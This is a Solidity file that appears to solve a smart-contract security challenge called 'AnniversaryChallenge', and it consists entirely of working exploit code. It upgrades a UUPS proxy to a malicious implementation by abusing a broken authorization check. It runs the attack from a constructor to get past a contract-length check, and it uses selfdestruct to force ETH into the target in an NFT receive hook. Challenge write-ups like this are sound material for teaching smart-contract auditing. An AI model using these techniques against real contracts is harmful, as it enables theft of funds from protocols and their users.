// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.20;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {SimpleStrategy} from "./SimpleStrategy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AnniversaryChallenge} from "./AnniversaryChallenge.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

// @notice Malicious implementation to replace the original SimpleStrategy via UUPS upgrade
contract ExploitStrategy is UUPSUpgradeable {
    address public owner;
    mapping(address => uint) public balances;
    address immutable public vault;
    address immutable public usdcAddress;

    constructor() payable {
        vault = 0xBe53A109B494E5c9f97b9Cd39Fe969BE68BF6204;
        usdcAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    }

    // @notice Dummy deployFunds function that does not spend allowance, causing safeApprove to fail on subsequent calls
    function deployFunds(uint256 amount) external returns (uint256) {
        return 0;
    }

    function _authorizeUpgrade(address) internal override {}
}

// @notice Executes the exploit in a single transaction to claim the Trophy NFT
// @notice Exploit is executed inside the constructor to bypass the contract length check
contract AttackContract {
    constructor(address challenge, address player) payable {
        // @notice Deploy a malicious implementation of SimpleStrategy
        ExploitStrategy newImpl = new ExploitStrategy();

        // @notice Upgrade the proxy to use the malicious implementation
        // @notice This is allowed due to the incorrect check in SimpleStrategy's _authorizeUpgrade
        address proxyAddress = address(AnniversaryChallenge(challenge).simpleStrategy());
        UUPSUpgradeable(proxyAddress).upgradeTo(address(newImpl));

        // @notice Call claimTrophy to set the USDC allowance, preparing for the safeApprove failure
        AnniversaryChallenge(challenge).claimTrophy(proxyAddress, 1 wei);

        // @notice Deploy a Receiver contract, funding it so it can forward 1 wei to the challenge contract via ForceSend
        Receiver receiver = new Receiver{value: 1 wei}(player);

        // @notice Calls claimTrophy again, which triggers the catch block
        // @notice Receiver sends ETH to the challenge contract inside safeTransferFrom call,
        // @notice satisfying the ETH balance requirement and enabling the Trophy NFT transfer
        AnniversaryChallenge(challenge).claimTrophy(address(receiver), 1e6);
    }
}

// @notice Upon deployment, forcibly transfers ETH to the target address using selfdestruct
contract ForceSend {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

contract Receiver is IERC721Receiver {
    address public player;

    constructor(address _player) payable {
        player = _player;
    }

    // @notice Called by safeTransferFrom when this contract receives an ERC721 token
    // @notice Forces ETH to the sender (challenge contract), receives the Trophy NFT and forwards it to the player
    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        new ForceSend{value: 1 wei}(from);

        // @notice Called by safeTransferFrom when this contract receives an ERC721 token
        IERC721(msg.sender).safeTransferFrom(address(this), player, tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }
}

